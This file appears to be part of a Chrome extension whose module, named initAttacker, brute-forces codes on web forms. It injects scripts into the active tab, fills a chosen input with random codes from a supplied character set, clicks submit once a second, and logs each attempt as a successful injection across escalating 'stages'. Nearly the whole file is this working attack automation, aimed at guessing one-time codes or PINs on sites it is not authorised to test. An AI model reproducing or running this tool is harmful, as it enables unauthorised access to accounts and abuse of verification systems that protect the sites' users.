import { content, executePopup } from "../client/app.js";
import terminal from "../view/terminal.js";
import countdown from "./countdown.js";
const soundsrc ={failure: "failure", failed: "failed"};

export default async function initAttacker(src) {
	if (chrome.scripting && chrome.tabs) {
		var prevData={};
		const [tab] = await chrome.tabs.query({active:true, currentWindow:true});
		chrome.scripting.executeScript({
			target: {tabId: tab.id},
			function: runScriptFunction,
			args: [src]
		}, function(injectionResults) {
			var [data] = injectionResults, request=0, stage=1, ul, time;
			content.innerHTML=terminal;
			executePopup(content, "STAGE-1");
			ul = document.querySelector(".status");
			var className="default";
			const timeout = setTimeout(function() {
				setInterval(function() {
					countdown();
					request++;
					if (request > 100 * stage) {
						var audio = new Audio("/sounds/" + soundsrc["failure"] + ".mp3");
						audio.play();
						stage++;
						className=className==="default" ? "switched" : "default";
						executePopup(content, `Failure`, true);
						ul.innerHTML="";
						setTimeout(function() {
							if (stage>=100) {
								audio = new Audio("/sounds/" + soundsrc["failed"] + ".mp3");
								audio.play();
								executePopup(content, "finished", null, true);
							} else {
								executePopup(content, `stage-${stage}`);
							}
						}, 2000);
					}
					var code = controllRandom(generateRandom(src), prevData, src);
					var date = new Date();
					var h = date.getHours();
					var m = date.getMinutes();
					var s = date.getSeconds();
					h = h < 10 ? '0' + h : h;
					m = m < 10 ? '0' + m : m;
					s = s < 10 ? '0' + s : s;
					time = `${h}:${m}:${s}`;
					data.result && chrome.scripting.executeScript({
						target: {tabId: tab.id},
						function: finalAttackerFunction,
						args: [code, src, stage]
					}, function(_injectionResults) {
						document.querySelector(".stage").textContent=stage;
						document.querySelector(".code").textContent=code;
						document.querySelector(".request").textContent=request;
						insertStatus(ul, code, time, stage, className);
						document.querySelector(".timestamp").classList.add("active");
					});
				}, 1000);
				clearTimeout(timeout);
			}, 2000);
		});
	}
}

function generateRandom(results) {
	var code="";
	for(var i=0; i < results.length; i++) {
		code+=results.src[Math.floor(Math.random() * results.src.length)];
	}
	return code;
}

function runScriptFunction(src) {
	var hastrigger;
	var hasinput = document.querySelector(src.selector);
	var buttons = document.querySelectorAll("form button");
	buttons.forEach(function(button) {
		if (button.form||button.type==="submit") {
			hastrigger=buttons;
			return;
		}
	});
	return hastrigger && hasinput;
}

function finalAttackerFunction(code, src, stage) {
	document.querySelector(src.selector).value=code;
	var buttons = document.querySelectorAll("form button");
	buttons.forEach(function(button) {
		if (button.type==="submit") {
			button.click();
			return {code, stage};
		}
	});
}

function insertStatus(parent, code, date, stage, className) {
	var scroller = parent.parentElement;
	var list = document.createElement("li");
	list.classList.add(className);
	list.innerHTML=`Success <span class="code">[${code}]</span> injected at ${date} on STAGE-${stage}...`;
	parent.appendChild(list);
	scroller.scrollTop=scroller.scrollHeight-scroller.clientHeight;
}

function controllRandom(code, prevData, results) {
	if ((code in prevData)) {
		generateRandom(results);
		document.querySelector(".rgpc") && document.querySelector(".rgpc").remove();
		document.querySelector(".status").innerHTML+="<li class='rgpc'>Re-generating possible code...</li>";
		return;
	}
	prevData[code]=code;
	return code;
}